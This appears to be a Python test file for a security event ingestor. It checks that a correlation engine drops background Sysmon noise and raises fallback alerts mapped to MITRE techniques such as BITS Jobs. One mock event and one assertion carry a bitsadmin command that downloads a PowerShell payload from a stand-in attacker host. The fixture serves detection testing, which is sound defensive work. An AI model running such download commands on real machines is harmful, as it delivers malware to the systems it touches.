from dataset_ingestor.correlation.engine import CorrelationEngine
from dataset_ingestor.ingestion import correlate_and_fallback_events


def test_background_noise_filtering_and_fallback():
    # Setup correlation engine
    engine = CorrelationEngine()

    # Define mitre_ids representing BITS Jobs (T1197)
    mitre_ids = ["T1197"]

    # 1. Mock raw events:
    # - Event 1: Background LSASS Access (EventID 10, TargetImage: lsass.exe)
    #   This matches T1003 rule, but T1003 is NOT in mitre_ids, so it should be discarded.
    # - Event 2: Bitsadmin process creation (EventID 1, CommandLine: bitsadmin.exe ...)
    #   This does not match T1003/T1110 rules, but is process creation, so it should generate a T1197 fallback alert.
    # - Event 3: Random background noise (EventID 99, no command line)
    #   This should be ignored entirely.

    raw_events = [
        {
            "EventID": 10,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe",
            "SourceImage": "C:\\Windows\\System32\\svchost.exe",
            "TimeCreated": "2026-06-13T12:00:00.000Z",
        },
        {
            "EventID": 1,
            "Channel": "Microsoft-Windows-Sysmon/Operational",
            "Image": "C:\\Windows\\System32\\bitsadmin.exe",
            "CommandLine": "bitsadmin.exe /transfer myjob http://attacker/payload.ps1 C:\\temp\\payload.ps1",
            "TimeCreated": "2026-06-13T12:01:00.000Z",
        },
        {"EventID": 99, "Channel": "Microsoft-Windows-Sysmon/Operational", "TimeCreated": "2026-06-13T12:02:00.000Z"},
    ]

    correlated = correlate_and_fallback_events(raw_events, mitre_ids, engine)

    # Verify results:
    # Only 1 alert should be generated (the fallback alert for the bitsadmin execution).
    # The background LSASS event and random noise event should be filtered out.
    assert len(correlated) == 1
    alert_record = correlated[0]

    assert alert_record["mitre_technique"] == "T1197"
    assert alert_record["correlation_rule"] == "Fallback alert for T1197 execution"

    # Check the wazuh alert payload structure
    alert_payload = alert_record["wazuh_alert"]
    assert alert_payload["rule"]["mitre"]["id"] == ["T1197"]
    assert (
        alert_payload["data"]["command"]
        == "bitsadmin.exe /transfer myjob http://attacker/payload.ps1 C:\\temp\\payload.ps1"
    )


def test_failsafe_generation_on_empty_correlation():
    # Setup correlation engine
    engine = CorrelationEngine()

    # Define mitre_ids representing Unix Shell (T1059.004)
    mitre_ids = ["T1059.004"]

    # 1. Mock raw events that do NOT match any correlation rules and are NOT execution events:
    # - Event 1 & 2: Background noise with no execution fields
    raw_events = [
        {"EventID": 99, "Channel": "SomeChannel", "TimeCreated": "2026-06-13T12:00:00.000Z"},
        {"EventID": 100, "Channel": "AnotherChannel", "TimeCreated": "2026-06-13T12:01:00.000Z"},
    ]

    correlated = correlate_and_fallback_events(raw_events, mitre_ids, engine)

    # Verify results:
    # Since no alerts were matched and no execution events were found,
    # the fail-safe should have triggered, creating fallback alerts for the events in raw_events.
    assert len(correlated) == 2
    for r in correlated:
        assert r["mitre_technique"] == "T1059.004"
        assert "failsafe" in r["correlation_rule"]
